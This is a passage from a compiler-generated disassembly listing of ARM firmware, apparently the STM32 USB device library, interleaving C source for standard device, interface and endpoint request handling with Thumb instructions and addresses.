 800b720:	68fb      	ldr	r3, [r7, #12]
}
 800b722:	4618      	mov	r0, r3
 800b724:	3714      	adds	r7, #20
 800b726:	46bd      	mov	sp, r7
 800b728:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b72c:	4770      	bx	lr

0800b72e <SWAPBYTE>:

/** @defgroup USBD_DEF_Exported_Macros
  * @{
  */
__STATIC_INLINE uint16_t SWAPBYTE(uint8_t *addr)
{
 800b72e:	b480      	push	{r7}
 800b730:	b087      	sub	sp, #28
 800b732:	af00      	add	r7, sp, #0
 800b734:	6078      	str	r0, [r7, #4]
  uint16_t _SwapVal;
  uint16_t _Byte1;
  uint16_t _Byte2;
  uint8_t *_pbuff = addr;
 800b736:	687b      	ldr	r3, [r7, #4]
 800b738:	617b      	str	r3, [r7, #20]

  _Byte1 = *(uint8_t *)_pbuff;
 800b73a:	697b      	ldr	r3, [r7, #20]
 800b73c:	781b      	ldrb	r3, [r3, #0]
 800b73e:	827b      	strh	r3, [r7, #18]
  _pbuff++;
 800b740:	697b      	ldr	r3, [r7, #20]
 800b742:	3301      	adds	r3, #1
 800b744:	617b      	str	r3, [r7, #20]
  _Byte2 = *(uint8_t *)_pbuff;
 800b746:	697b      	ldr	r3, [r7, #20]
 800b748:	781b      	ldrb	r3, [r3, #0]
 800b74a:	823b      	strh	r3, [r7, #16]

  _SwapVal = (_Byte2 << 8) | _Byte1;
 800b74c:	8a3b      	ldrh	r3, [r7, #16]
 800b74e:	021b      	lsls	r3, r3, #8
 800b750:	b21a      	sxth	r2, r3
 800b752:	f9b7 3012 	ldrsh.w	r3, [r7, #18]
 800b756:	4313      	orrs	r3, r2
 800b758:	b21b      	sxth	r3, r3
 800b75a:	81fb      	strh	r3, [r7, #14]

  return _SwapVal;
 800b75c:	89fb      	ldrh	r3, [r7, #14]
}
 800b75e:	4618      	mov	r0, r3
 800b760:	371c      	adds	r7, #28
 800b762:	46bd      	mov	sp, r7
 800b764:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b768:	4770      	bx	lr
	...

0800b76c <USBD_StdDevReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdDevReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b76c:	b580      	push	{r7, lr}
 800b76e:	b084      	sub	sp, #16
 800b770:	af00      	add	r7, sp, #0
 800b772:	6078      	str	r0, [r7, #4]
 800b774:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800b776:	2300      	movs	r3, #0
 800b778:	73fb      	strb	r3, [r7, #15]

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b77a:	683b      	ldr	r3, [r7, #0]
 800b77c:	781b      	ldrb	r3, [r3, #0]
 800b77e:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b782:	2b40      	cmp	r3, #64	; 0x40
 800b784:	d005      	beq.n	800b792 <USBD_StdDevReq+0x26>
 800b786:	2b40      	cmp	r3, #64	; 0x40
 800b788:	d857      	bhi.n	800b83a <USBD_StdDevReq+0xce>
 800b78a:	2b00      	cmp	r3, #0
 800b78c:	d00f      	beq.n	800b7ae <USBD_StdDevReq+0x42>
 800b78e:	2b20      	cmp	r3, #32
 800b790:	d153      	bne.n	800b83a <USBD_StdDevReq+0xce>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
      ret = (USBD_StatusTypeDef)pdev->pClass[pdev->classId]->Setup(pdev, req);
 800b792:	687b      	ldr	r3, [r7, #4]
 800b794:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800b798:	687b      	ldr	r3, [r7, #4]
 800b79a:	32ae      	adds	r2, #174	; 0xae
 800b79c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b7a0:	689b      	ldr	r3, [r3, #8]
 800b7a2:	6839      	ldr	r1, [r7, #0]
 800b7a4:	6878      	ldr	r0, [r7, #4]
 800b7a6:	4798      	blx	r3
 800b7a8:	4603      	mov	r3, r0
 800b7aa:	73fb      	strb	r3, [r7, #15]
      break;
 800b7ac:	e04a      	b.n	800b844 <USBD_StdDevReq+0xd8>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 800b7ae:	683b      	ldr	r3, [r7, #0]
 800b7b0:	785b      	ldrb	r3, [r3, #1]
 800b7b2:	2b09      	cmp	r3, #9
 800b7b4:	d83b      	bhi.n	800b82e <USBD_StdDevReq+0xc2>
 800b7b6:	a201      	add	r2, pc, #4	; (adr r2, 800b7bc <USBD_StdDevReq+0x50>)
 800b7b8:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800b7bc:	0800b811 	.word	0x0800b811
 800b7c0:	0800b825 	.word	0x0800b825
 800b7c4:	0800b82f 	.word	0x0800b82f
 800b7c8:	0800b81b 	.word	0x0800b81b
 800b7cc:	0800b82f 	.word	0x0800b82f
 800b7d0:	0800b7ef 	.word	0x0800b7ef
 800b7d4:	0800b7e5 	.word	0x0800b7e5
 800b7d8:	0800b82f 	.word	0x0800b82f
 800b7dc:	0800b807 	.word	0x0800b807
 800b7e0:	0800b7f9 	.word	0x0800b7f9
      {
        case USB_REQ_GET_DESCRIPTOR:
          USBD_GetDescriptor(pdev, req);
 800b7e4:	6839      	ldr	r1, [r7, #0]
 800b7e6:	6878      	ldr	r0, [r7, #4]
 800b7e8:	f000 fa3c 	bl	800bc64 <USBD_GetDescriptor>
          break;
 800b7ec:	e024      	b.n	800b838 <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_ADDRESS:
          USBD_SetAddress(pdev, req);
 800b7ee:	6839      	ldr	r1, [r7, #0]
 800b7f0:	6878      	ldr	r0, [r7, #4]
 800b7f2:	f000 fbcb 	bl	800bf8c <USBD_SetAddress>
          break;
 800b7f6:	e01f      	b.n	800b838 <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_CONFIGURATION:
          ret = USBD_SetConfig(pdev, req);
 800b7f8:	6839      	ldr	r1, [r7, #0]
 800b7fa:	6878      	ldr	r0, [r7, #4]
 800b7fc:	f000 fc0a 	bl	800c014 <USBD_SetConfig>
 800b800:	4603      	mov	r3, r0
 800b802:	73fb      	strb	r3, [r7, #15]
          break;
 800b804:	e018      	b.n	800b838 <USBD_StdDevReq+0xcc>

        case USB_REQ_GET_CONFIGURATION:
          USBD_GetConfig(pdev, req);
 800b806:	6839      	ldr	r1, [r7, #0]
 800b808:	6878      	ldr	r0, [r7, #4]
 800b80a:	f000 fcad 	bl	800c168 <USBD_GetConfig>
          break;
 800b80e:	e013      	b.n	800b838 <USBD_StdDevReq+0xcc>

        case USB_REQ_GET_STATUS:
          USBD_GetStatus(pdev, req);
 800b810:	6839      	ldr	r1, [r7, #0]
 800b812:	6878      	ldr	r0, [r7, #4]
 800b814:	f000 fcde 	bl	800c1d4 <USBD_GetStatus>
          break;
 800b818:	e00e      	b.n	800b838 <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_FEATURE:
          USBD_SetFeature(pdev, req);
 800b81a:	6839      	ldr	r1, [r7, #0]
 800b81c:	6878      	ldr	r0, [r7, #4]
 800b81e:	f000 fd0d 	bl	800c23c <USBD_SetFeature>
          break;
 800b822:	e009      	b.n	800b838 <USBD_StdDevReq+0xcc>

        case USB_REQ_CLEAR_FEATURE:
          USBD_ClrFeature(pdev, req);
 800b824:	6839      	ldr	r1, [r7, #0]
 800b826:	6878      	ldr	r0, [r7, #4]
 800b828:	f000 fd31 	bl	800c28e <USBD_ClrFeature>
          break;
 800b82c:	e004      	b.n	800b838 <USBD_StdDevReq+0xcc>

        default:
          USBD_CtlError(pdev, req);
 800b82e:	6839      	ldr	r1, [r7, #0]
 800b830:	6878      	ldr	r0, [r7, #4]
 800b832:	f000 fd88 	bl	800c346 <USBD_CtlError>
          break;
 800b836:	bf00      	nop
      }
      break;
 800b838:	e004      	b.n	800b844 <USBD_StdDevReq+0xd8>

    default:
      USBD_CtlError(pdev, req);
 800b83a:	6839      	ldr	r1, [r7, #0]
 800b83c:	6878      	ldr	r0, [r7, #4]
 800b83e:	f000 fd82 	bl	800c346 <USBD_CtlError>
      break;
 800b842:	bf00      	nop
  }

  return ret;
 800b844:	7bfb      	ldrb	r3, [r7, #15]
}
 800b846:	4618      	mov	r0, r3
 800b848:	3710      	adds	r7, #16
 800b84a:	46bd      	mov	sp, r7
 800b84c:	bd80      	pop	{r7, pc}
 800b84e:	bf00      	nop

0800b850 <USBD_StdItfReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdItfReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b850:	b580      	push	{r7, lr}
 800b852:	b084      	sub	sp, #16
 800b854:	af00      	add	r7, sp, #0
 800b856:	6078      	str	r0, [r7, #4]
 800b858:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800b85a:	2300      	movs	r3, #0
 800b85c:	73fb      	strb	r3, [r7, #15]
  uint8_t idx;

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b85e:	683b      	ldr	r3, [r7, #0]
 800b860:	781b      	ldrb	r3, [r3, #0]
 800b862:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b866:	2b40      	cmp	r3, #64	; 0x40
 800b868:	d005      	beq.n	800b876 <USBD_StdItfReq+0x26>
 800b86a:	2b40      	cmp	r3, #64	; 0x40
 800b86c:	d852      	bhi.n	800b914 <USBD_StdItfReq+0xc4>
 800b86e:	2b00      	cmp	r3, #0
 800b870:	d001      	beq.n	800b876 <USBD_StdItfReq+0x26>
 800b872:	2b20      	cmp	r3, #32
 800b874:	d14e      	bne.n	800b914 <USBD_StdItfReq+0xc4>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
    case USB_REQ_TYPE_STANDARD:
      switch (pdev->dev_state)
 800b876:	687b      	ldr	r3, [r7, #4]
 800b878:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b87c:	b2db      	uxtb	r3, r3
 800b87e:	3b01      	subs	r3, #1
 800b880:	2b02      	cmp	r3, #2
 800b882:	d840      	bhi.n	800b906 <USBD_StdItfReq+0xb6>
      {
        case USBD_STATE_DEFAULT:
        case USBD_STATE_ADDRESSED:
        case USBD_STATE_CONFIGURED:

          if (LOBYTE(req->wIndex) <= USBD_MAX_NUM_INTERFACES)
 800b884:	683b      	ldr	r3, [r7, #0]
 800b886:	889b      	ldrh	r3, [r3, #4]
 800b888:	b2db      	uxtb	r3, r3
 800b88a:	2b01      	cmp	r3, #1
 800b88c:	d836      	bhi.n	800b8fc <USBD_StdItfReq+0xac>
          {
            /* Get the class index relative to this interface */
            idx = USBD_CoreFindIF(pdev, LOBYTE(req->wIndex));
 800b88e:	683b      	ldr	r3, [r7, #0]
 800b890:	889b      	ldrh	r3, [r3, #4]
 800b892:	b2db      	uxtb	r3, r3
 800b894:	4619      	mov	r1, r3
 800b896:	6878      	ldr	r0, [r7, #4]
 800b898:	f7ff fed8 	bl	800b64c <USBD_CoreFindIF>
 800b89c:	4603      	mov	r3, r0
 800b89e:	73bb      	strb	r3, [r7, #14]
            if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b8a0:	7bbb      	ldrb	r3, [r7, #14]
 800b8a2:	2bff      	cmp	r3, #255	; 0xff
 800b8a4:	d01d      	beq.n	800b8e2 <USBD_StdItfReq+0x92>
 800b8a6:	7bbb      	ldrb	r3, [r7, #14]
 800b8a8:	2b00      	cmp	r3, #0
 800b8aa:	d11a      	bne.n	800b8e2 <USBD_StdItfReq+0x92>
            {
              /* Call the class data out function to manage the request */
              if (pdev->pClass[idx]->Setup != NULL)
 800b8ac:	7bba      	ldrb	r2, [r7, #14]
 800b8ae:	687b      	ldr	r3, [r7, #4]
 800b8b0:	32ae      	adds	r2, #174	; 0xae
 800b8b2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b8b6:	689b      	ldr	r3, [r3, #8]
 800b8b8:	2b00      	cmp	r3, #0
 800b8ba:	d00f      	beq.n	800b8dc <USBD_StdItfReq+0x8c>
              {
                pdev->classId = idx;
 800b8bc:	7bba      	ldrb	r2, [r7, #14]
 800b8be:	687b      	ldr	r3, [r7, #4]
 800b8c0:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
                ret = (USBD_StatusTypeDef)(pdev->pClass[idx]->Setup(pdev, req));
 800b8c4:	7bba      	ldrb	r2, [r7, #14]
 800b8c6:	687b      	ldr	r3, [r7, #4]
 800b8c8:	32ae      	adds	r2, #174	; 0xae
 800b8ca:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b8ce:	689b      	ldr	r3, [r3, #8]
 800b8d0:	6839      	ldr	r1, [r7, #0]
 800b8d2:	6878      	ldr	r0, [r7, #4]
 800b8d4:	4798      	blx	r3
 800b8d6:	4603      	mov	r3, r0
 800b8d8:	73fb      	strb	r3, [r7, #15]
              if (pdev->pClass[idx]->Setup != NULL)
 800b8da:	e004      	b.n	800b8e6 <USBD_StdItfReq+0x96>
              }
              else
              {
                /* should never reach this condition */
                ret = USBD_FAIL;
 800b8dc:	2303      	movs	r3, #3
 800b8de:	73fb      	strb	r3, [r7, #15]
              if (pdev->pClass[idx]->Setup != NULL)
 800b8e0:	e001      	b.n	800b8e6 <USBD_StdItfReq+0x96>
              }
            }
            else
            {
              /* No relative interface found */
              ret = USBD_FAIL;
 800b8e2:	2303      	movs	r3, #3
 800b8e4:	73fb      	strb	r3, [r7, #15]
            }

            if ((req->wLength == 0U) && (ret == USBD_OK))
 800b8e6:	683b      	ldr	r3, [r7, #0]
 800b8e8:	88db      	ldrh	r3, [r3, #6]
 800b8ea:	2b00      	cmp	r3, #0
 800b8ec:	d110      	bne.n	800b910 <USBD_StdItfReq+0xc0>
 800b8ee:	7bfb      	ldrb	r3, [r7, #15]
 800b8f0:	2b00      	cmp	r3, #0
 800b8f2:	d10d      	bne.n	800b910 <USBD_StdItfReq+0xc0>
            {
              (void)USBD_CtlSendStatus(pdev);
 800b8f4:	6878      	ldr	r0, [r7, #4]
 800b8f6:	f000 fdf1 	bl	800c4dc <USBD_CtlSendStatus>
          }
          else
          {
            USBD_CtlError(pdev, req);
          }
          break;
 800b8fa:	e009      	b.n	800b910 <USBD_StdItfReq+0xc0>
            USBD_CtlError(pdev, req);
 800b8fc:	6839      	ldr	r1, [r7, #0]
 800b8fe:	6878      	ldr	r0, [r7, #4]
 800b900:	f000 fd21 	bl	800c346 <USBD_CtlError>
          break;
 800b904:	e004      	b.n	800b910 <USBD_StdItfReq+0xc0>

        default:
          USBD_CtlError(pdev, req);
 800b906:	6839      	ldr	r1, [r7, #0]
 800b908:	6878      	ldr	r0, [r7, #4]
 800b90a:	f000 fd1c 	bl	800c346 <USBD_CtlError>
          break;
 800b90e:	e000      	b.n	800b912 <USBD_StdItfReq+0xc2>
          break;
 800b910:	bf00      	nop
      }
      break;
 800b912:	e004      	b.n	800b91e <USBD_StdItfReq+0xce>

    default:
      USBD_CtlError(pdev, req);
 800b914:	6839      	ldr	r1, [r7, #0]
 800b916:	6878      	ldr	r0, [r7, #4]
 800b918:	f000 fd15 	bl	800c346 <USBD_CtlError>
      break;
 800b91c:	bf00      	nop
  }

  return ret;
 800b91e:	7bfb      	ldrb	r3, [r7, #15]
}
 800b920:	4618      	mov	r0, r3
 800b922:	3710      	adds	r7, #16
 800b924:	46bd      	mov	sp, r7
 800b926:	bd80      	pop	{r7, pc}

0800b928 <USBD_StdEPReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdEPReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b928:	b580      	push	{r7, lr}
 800b92a:	b084      	sub	sp, #16
 800b92c:	af00      	add	r7, sp, #0
 800b92e:	6078      	str	r0, [r7, #4]
 800b930:	6039      	str	r1, [r7, #0]
  USBD_EndpointTypeDef *pep;
  uint8_t ep_addr;
  uint8_t idx;
  USBD_StatusTypeDef ret = USBD_OK;
 800b932:	2300      	movs	r3, #0
 800b934:	73fb      	strb	r3, [r7, #15]

  ep_addr = LOBYTE(req->wIndex);
 800b936:	683b      	ldr	r3, [r7, #0]
 800b938:	889b      	ldrh	r3, [r3, #4]
 800b93a:	73bb      	strb	r3, [r7, #14]

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b93c:	683b      	ldr	r3, [r7, #0]
 800b93e:	781b      	ldrb	r3, [r3, #0]
 800b940:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b944:	2b40      	cmp	r3, #64	; 0x40
 800b946:	d007      	beq.n	800b958 <USBD_StdEPReq+0x30>
 800b948:	2b40      	cmp	r3, #64	; 0x40
 800b94a:	f200 817f 	bhi.w	800bc4c <USBD_StdEPReq+0x324>
 800b94e:	2b00      	cmp	r3, #0
 800b950:	d02a      	beq.n	800b9a8 <USBD_StdEPReq+0x80>
 800b952:	2b20      	cmp	r3, #32
 800b954:	f040 817a 	bne.w	800bc4c <USBD_StdEPReq+0x324>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
      /* Get the class index relative to this endpoint */
      idx = USBD_CoreFindEP(pdev, ep_addr);
 800b958:	7bbb      	ldrb	r3, [r7, #14]
 800b95a:	4619      	mov	r1, r3
 800b95c:	6878      	ldr	r0, [r7, #4]
 800b95e:	f7ff fe82 	bl	800b666 <USBD_CoreFindEP>
 800b962:	4603      	mov	r3, r0
 800b964:	737b      	strb	r3, [r7, #13]
      if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b966:	7b7b      	ldrb	r3, [r7, #13]
 800b968:	2bff      	cmp	r3, #255	; 0xff
 800b96a:	f000 8174 	beq.w	800bc56 <USBD_StdEPReq+0x32e>
 800b96e:	7b7b      	ldrb	r3, [r7, #13]
 800b970:	2b00      	cmp	r3, #0
 800b972:	f040 8170 	bne.w	800bc56 <USBD_StdEPReq+0x32e>
      {
        pdev->classId = idx;
 800b976:	7b7a      	ldrb	r2, [r7, #13]
 800b978:	687b      	ldr	r3, [r7, #4]
 800b97a:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
        /* Call the class data out function to manage the request */
        if (pdev->pClass[idx]->Setup != NULL)
 800b97e:	7b7a      	ldrb	r2, [r7, #13]
 800b980:	687b      	ldr	r3, [r7, #4]
 800b982:	32ae      	adds	r2, #174	; 0xae
 800b984:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b988:	689b      	ldr	r3, [r3, #8]
 800b98a:	2b00      	cmp	r3, #0
 800b98c:	f000 8163 	beq.w	800bc56 <USBD_StdEPReq+0x32e>
        {
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->Setup(pdev, req);
 800b990:	7b7a      	ldrb	r2, [r7, #13]
 800b992:	687b      	ldr	r3, [r7, #4]
 800b994:	32ae      	adds	r2, #174	; 0xae
 800b996:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b99a:	689b      	ldr	r3, [r3, #8]
 800b99c:	6839      	ldr	r1, [r7, #0]
 800b99e:	6878      	ldr	r0, [r7, #4]
 800b9a0:	4798      	blx	r3
 800b9a2:	4603      	mov	r3, r0
 800b9a4:	73fb      	strb	r3, [r7, #15]
        }
      }
      break;
 800b9a6:	e156      	b.n	800bc56 <USBD_StdEPReq+0x32e>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 800b9a8:	683b      	ldr	r3, [r7, #0]
 800b9aa:	785b      	ldrb	r3, [r3, #1]
 800b9ac:	2b03      	cmp	r3, #3
 800b9ae:	d008      	beq.n	800b9c2 <USBD_StdEPReq+0x9a>
 800b9b0:	2b03      	cmp	r3, #3
 800b9b2:	f300 8145 	bgt.w	800bc40 <USBD_StdEPReq+0x318>
 800b9b6:	2b00      	cmp	r3, #0
 800b9b8:	f000 809b 	beq.w	800baf2 <USBD_StdEPReq+0x1ca>
 800b9bc:	2b01      	cmp	r3, #1
 800b9be:	d03c      	beq.n	800ba3a <USBD_StdEPReq+0x112>
 800b9c0:	e13e      	b.n	800bc40 <USBD_StdEPReq+0x318>
      {
        case USB_REQ_SET_FEATURE:
          switch (pdev->dev_state)
 800b9c2:	687b      	ldr	r3, [r7, #4]
 800b9c4:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b9c8:	b2db      	uxtb	r3, r3
 800b9ca:	2b02      	cmp	r3, #2
 800b9cc:	d002      	beq.n	800b9d4 <USBD_StdEPReq+0xac>
 800b9ce:	2b03      	cmp	r3, #3
 800b9d0:	d016      	beq.n	800ba00 <USBD_StdEPReq+0xd8>
 800b9d2:	e02c      	b.n	800ba2e <USBD_StdEPReq+0x106>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800b9d4:	7bbb      	ldrb	r3, [r7, #14]
 800b9d6:	2b00      	cmp	r3, #0
 800b9d8:	d00d      	beq.n	800b9f6 <USBD_StdEPReq+0xce>
 800b9da:	7bbb      	ldrb	r3, [r7, #14]
 800b9dc:	2b80      	cmp	r3, #128	; 0x80
 800b9de:	d00a      	beq.n	800b9f6 <USBD_StdEPReq+0xce>
              {
                (void)USBD_LL_StallEP(pdev, ep_addr);
 800b9e0:	7bbb      	ldrb	r3, [r7, #14]
 800b9e2:	4619      	mov	r1, r3
 800b9e4:	6878      	ldr	r0, [r7, #4]
 800b9e6:	f001 fa21 	bl	800ce2c <USBD_LL_StallEP>
                (void)USBD_LL_StallEP(pdev, 0x80U);
 800b9ea:	2180      	movs	r1, #128	; 0x80
 800b9ec:	6878      	ldr	r0, [r7, #4]
 800b9ee:	f001 fa1d 	bl	800ce2c <USBD_LL_StallEP>
 800b9f2:	bf00      	nop
              }
              else
              {
                USBD_CtlError(pdev, req);
              }
              break;
 800b9f4:	e020      	b.n	800ba38 <USBD_StdEPReq+0x110>
                USBD_CtlError(pdev, req);
 800b9f6:	6839      	ldr	r1, [r7, #0]
 800b9f8:	6878      	ldr	r0, [r7, #4]
 800b9fa:	f000 fca4 	bl	800c346 <USBD_CtlError>
              break;
 800b9fe:	e01b      	b.n	800ba38 <USBD_StdEPReq+0x110>

            case USBD_STATE_CONFIGURED:
              if (req->wValue == USB_FEATURE_EP_HALT)
 800ba00:	683b      	ldr	r3, [r7, #0]
 800ba02:	885b      	ldrh	r3, [r3, #2]
 800ba04:	2b00      	cmp	r3, #0
 800ba06:	d10e      	bne.n	800ba26 <USBD_StdEPReq+0xfe>
              {
                if ((ep_addr != 0x00U) && (ep_addr != 0x80U) && (req->wLength == 0x00U))
 800ba08:	7bbb      	ldrb	r3, [r7, #14]
 800ba0a:	2b00      	cmp	r3, #0
 800ba0c:	d00b      	beq.n	800ba26 <USBD_StdEPReq+0xfe>
 800ba0e:	7bbb      	ldrb	r3, [r7, #14]
 800ba10:	2b80      	cmp	r3, #128	; 0x80
 800ba12:	d008      	beq.n	800ba26 <USBD_StdEPReq+0xfe>
 800ba14:	683b      	ldr	r3, [r7, #0]
 800ba16:	88db      	ldrh	r3, [r3, #6]
 800ba18:	2b00      	cmp	r3, #0
 800ba1a:	d104      	bne.n	800ba26 <USBD_StdEPReq+0xfe>
                {
                  (void)USBD_LL_StallEP(pdev, ep_addr);
 800ba1c:	7bbb      	ldrb	r3, [r7, #14]
 800ba1e:	4619      	mov	r1, r3
 800ba20:	6878      	ldr	r0, [r7, #4]
 800ba22:	f001 fa03 	bl	800ce2c <USBD_LL_StallEP>
                }
              }
              (void)USBD_CtlSendStatus(pdev);
 800ba26:	6878      	ldr	r0, [r7, #4]
 800ba28:	f000 fd58 	bl	800c4dc <USBD_CtlSendStatus>

              break;
 800ba2c:	e004      	b.n	800ba38 <USBD_StdEPReq+0x110>

            default:
              USBD_CtlError(pdev, req);
 800ba2e:	6839      	ldr	r1, [r7, #0]
 800ba30:	6878      	ldr	r0, [r7, #4]
 800ba32:	f000 fc88 	bl	800c346 <USBD_CtlError>
              break;
 800ba36:	bf00      	nop
          }
          break;
 800ba38:	e107      	b.n	800bc4a <USBD_StdEPReq+0x322>

        case USB_REQ_CLEAR_FEATURE:

          switch (pdev->dev_state)
 800ba3a:	687b      	ldr	r3, [r7, #4]
 800ba3c:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800ba40:	b2db      	uxtb	r3, r3
 800ba42:	2b02      	cmp	r3, #2
 800ba44:	d002      	beq.n	800ba4c <USBD_StdEPReq+0x124>
 800ba46:	2b03      	cmp	r3, #3
 800ba48:	d016      	beq.n	800ba78 <USBD_StdEPReq+0x150>
 800ba4a:	e04b      	b.n	800bae4 <USBD_StdEPReq+0x1bc>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800ba4c:	7bbb      	ldrb	r3, [r7, #14]
 800ba4e:	2b00      	cmp	r3, #0
 800ba50:	d00d      	beq.n	800ba6e <USBD_StdEPReq+0x146>
 800ba52:	7bbb      	ldrb	r3, [r7, #14]
 800ba54:	2b80      	cmp	r3, #128	; 0x80
 800ba56:	d00a      	beq.n	800ba6e <USBD_StdEPReq+0x146>
              {
                (void)USBD_LL_StallEP(pdev, ep_addr);
 800ba58:	7bbb      	ldrb	r3, [r7, #14]
 800ba5a:	4619      	mov	r1, r3
 800ba5c:	6878      	ldr	r0, [r7, #4]
 800ba5e:	f001 f9e5 	bl	800ce2c <USBD_LL_StallEP>
                (void)USBD_LL_StallEP(pdev, 0x80U);
 800ba62:	2180      	movs	r1, #128	; 0x80
 800ba64:	6878      	ldr	r0, [r7, #4]
 800ba66:	f001 f9e1 	bl	800ce2c <USBD_LL_StallEP>
 800ba6a:	bf00      	nop
              }
              else
              {
                USBD_CtlError(pdev, req);
              }
              break;
 800ba6c:	e040      	b.n	800baf0 <USBD_StdEPReq+0x1c8>
                USBD_CtlError(pdev, req);
 800ba6e:	6839      	ldr	r1, [r7, #0]
 800ba70:	6878      	ldr	r0, [r7, #4]
 800ba72:	f000 fc68 	bl	800c346 <USBD_CtlError>
              break;
 800ba76:	e03b      	b.n	800baf0 <USBD_StdEPReq+0x1c8>

            case USBD_STATE_CONFIGURED:
              if (req->wValue == USB_FEATURE_EP_HALT)
 800ba78:	683b      	ldr	r3, [r7, #0]
 800ba7a:	885b      	ldrh	r3, [r3, #2]
 800ba7c:	2b00      	cmp	r3, #0
 800ba7e:	d136      	bne.n	800baee <USBD_StdEPReq+0x1c6>
              {
                if ((ep_addr & 0x7FU) != 0x00U)
 800ba80:	7bbb      	ldrb	r3, [r7, #14]
 800ba82:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800ba86:	2b00      	cmp	r3, #0
 800ba88:	d004      	beq.n	800ba94 <USBD_StdEPReq+0x16c>
                {
                  (void)USBD_LL_ClearStallEP(pdev, ep_addr);
 800ba8a:	7bbb      	ldrb	r3, [r7, #14]
 800ba8c:	4619      	mov	r1, r3
 800ba8e:	6878      	ldr	r0, [r7, #4]
 800ba90:	f001 fa02 	bl	800ce98 <USBD_LL_ClearStallEP>
                }
                (void)USBD_CtlSendStatus(pdev);
 800ba94:	6878      	ldr	r0, [r7, #4]
 800ba96:	f000 fd21 	bl	800c4dc <USBD_CtlSendStatus>

                /* Get the class index relative to this interface */
                idx = USBD_CoreFindEP(pdev, ep_addr);
 800ba9a:	7bbb      	ldrb	r3, [r7, #14]
 800ba9c:	4619      	mov	r1, r3
 800ba9e:	6878      	ldr	r0, [r7, #4]
 800baa0:	f7ff fde1 	bl	800b666 <USBD_CoreFindEP>
 800baa4:	4603      	mov	r3, r0
 800baa6:	737b      	strb	r3, [r7, #13]
                if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800baa8:	7b7b      	ldrb	r3, [r7, #13]
 800baaa:	2bff      	cmp	r3, #255	; 0xff
 800baac:	d01f      	beq.n	800baee <USBD_StdEPReq+0x1c6>
 800baae:	7b7b      	ldrb	r3, [r7, #13]
 800bab0:	2b00      	cmp	r3, #0
 800bab2:	d11c      	bne.n	800baee <USBD_StdEPReq+0x1c6>
                {
                  pdev->classId = idx;
 800bab4:	7b7a      	ldrb	r2, [r7, #13]
 800bab6:	687b      	ldr	r3, [r7, #4]
 800bab8:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
                  /* Call the class data out function to manage the request */
                  if (pdev->pClass[idx]->Setup != NULL)
 800babc:	7b7a      	ldrb	r2, [r7, #13]
 800babe:	687b      	ldr	r3, [r7, #4]
 800bac0:	32ae      	adds	r2, #174	; 0xae
 800bac2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800bac6:	689b      	ldr	r3, [r3, #8]
 800bac8:	2b00      	cmp	r3, #0
 800baca:	d010      	beq.n	800baee <USBD_StdEPReq+0x1c6>
                  {
                    ret = (USBD_StatusTypeDef)(pdev->pClass[idx]->Setup(pdev, req));
 800bacc:	7b7a      	ldrb	r2, [r7, #13]
 800bace:	687b      	ldr	r3, [r7, #4]
 800bad0:	32ae      	adds	r2, #174	; 0xae
 800bad2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800bad6:	689b      	ldr	r3, [r3, #8]
 800bad8:	6839      	ldr	r1, [r7, #0]
 800bada:	6878      	ldr	r0, [r7, #4]
 800badc:	4798      	blx	r3
 800bade:	4603      	mov	r3, r0
 800bae0:	73fb      	strb	r3, [r7, #15]
                  }
                }
              }
              break;
 800bae2:	e004      	b.n	800baee <USBD_StdEPReq+0x1c6>

            default:
              USBD_CtlError(pdev, req);
